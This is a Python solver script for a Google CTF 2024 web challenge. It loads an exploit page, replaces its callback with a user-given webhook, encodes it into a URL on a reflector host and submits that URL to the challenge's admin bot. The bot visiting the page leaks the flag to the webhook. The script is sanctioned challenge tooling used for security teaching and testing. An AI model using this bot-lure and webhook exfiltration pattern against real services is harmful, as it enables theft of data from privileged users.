# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from urllib.parse import quote
import requests, re, sys

sess =requests.Session()
URL = 'https://bot.postviewer3-web.2024.ctfcompetition.com/bot'
NO_CAPTCHA = '1vbty8mhizeja1tiqddq'

WEBHOOK = input("Please give a webhook URL to receive a flag\n")
if not WEBHOOK.startswith('http://') and not WEBHOOK.startswith('https://'):
  print("Missing protocol")
  exit(1)

WITH_FLAG = True if (len(sys.argv) > 1 and sys.argv[1] == '--flag') else False

with open('solve.html') as f:
    poc = f.read()
    poc = re.sub(r'[ ]+', ' ', poc)
    poc = re.sub(r'\n+', '\n', poc)
    poc = re.sub(r'/\*[\w\W]*?\*/', '', poc)
    poc = poc.replace('http://localhost:9999', WEBHOOK)
    if not WITH_FLAG:
      poc = poc.replace("url.searchParams.set('flag', e.data.flag);",
                        "url.searchParams.set('solvable', '');")

    url = 'https://reflect-html.glitch.me/#' + quote(poc)
    with open('req.txt', 'w') as f:
      f.write(url)
    print('sending to bot')
    r = sess.post(URL, headers={
        'x-admin-secret': NO_CAPTCHA,
        'content-type': 'application/json'
    }, json={
        'url': url
    }, stream=True)
    for line in r.iter_lines():
        # filter out keep-alive new lines
        if line:
          print(line)
          if b'Timed out' in line:
            exit()
